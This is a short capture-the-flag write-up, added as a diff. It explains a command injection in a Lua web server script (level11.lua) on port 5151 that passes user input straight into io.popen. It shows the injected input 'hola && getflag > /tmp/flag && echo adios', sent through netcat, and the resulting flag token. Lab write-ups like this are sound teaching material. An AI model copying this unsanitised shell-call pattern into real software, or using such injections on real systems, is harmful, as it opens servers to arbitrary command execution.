@@ -1,0 +1,18 @@
+We realize that there is a file in user folder, level11.lua.
+
+This file is a script for a web server, accepting connections in port 5151. It receives a string and execute a hash function, comparing it with another hash string it has.
+
+When creating the hash for the string, we observe it is opening a process executing a shell command:
+
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+There is a vulnerability here because we can inject whatever we want in the pass variable to be executed. We take advantage of this trough netcat:
+
+nc localhost 5151
+
+hola && getflag > /tmp/flag && echo adios
+
+And we successfully write the flag in /tmp/flag
+
+cat /tmp/flag -> Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
